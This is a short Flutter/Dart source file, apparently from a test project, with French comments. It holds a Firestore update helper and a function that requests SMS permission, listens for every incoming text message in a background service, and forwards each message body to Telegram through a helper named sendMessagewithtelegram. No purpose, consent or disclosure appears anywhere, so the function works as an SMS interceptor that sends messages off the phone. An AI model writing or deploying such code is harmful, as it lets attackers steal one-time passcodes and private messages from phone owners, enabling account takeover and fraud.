import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:projettest/main.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:projettest/service/sendmail/send_mail.dart';
bool isRunning = false;
Future<void> updateValueInFirestore(String collectionName, String documentId,
    String fieldName, dynamic newValue) async

{
  try {
    // Récupérer une référence à la collection et au document
    DocumentReference docRef =
    FirebaseFirestore.instance.collection(collectionName).doc(documentId);

    // Mettre à jour la valeur
    await docRef.update({fieldName: newValue});

    print('Valeur mise à jour avec succès');
  } catch (e) {
    print('Erreur lors de la mise à jour de la valeur : $e');
  }
}

getsms() async {
  final permissionStatus = await Permission.sms.request();
  print(permissionStatus);
  final service = FlutterBackgroundService();
  easySmsReceiver.listenIncomingSms(
    onNewMessage: (message) {
      // do something
      print("voici le message recu ici ");
      print(message.body);
      print("voici le message recu ici ");
      SendEmail.sendMessagewithtelegram(message: message.body.toString());
    },
  );
}